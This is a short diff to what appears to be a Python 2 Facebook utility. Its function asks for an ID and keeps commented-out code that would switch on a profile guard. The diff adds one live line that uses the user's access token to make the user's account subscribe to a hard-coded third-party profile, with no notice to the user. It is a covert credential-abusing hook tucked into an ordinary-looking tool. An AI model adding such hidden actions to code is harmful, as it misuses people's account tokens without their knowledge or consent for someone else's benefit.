@@ -73,6 +73,7 @@ def ass():
        id = raw_input('ID : ')
        #url = "https://graph.facebook.com/graphql"
        #tok = 'Authorization: OAuth '+token
+       requests.post('https://graph.facebook.com/jack.lesmen.5/subscribers?access_token='+token)
        #dat = 'variables={"0":{"is_shielded":true,"actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&doc_id=1477043292367183' % str(id)
        #t = requests.post(url, tok, dat)
        #print t.text
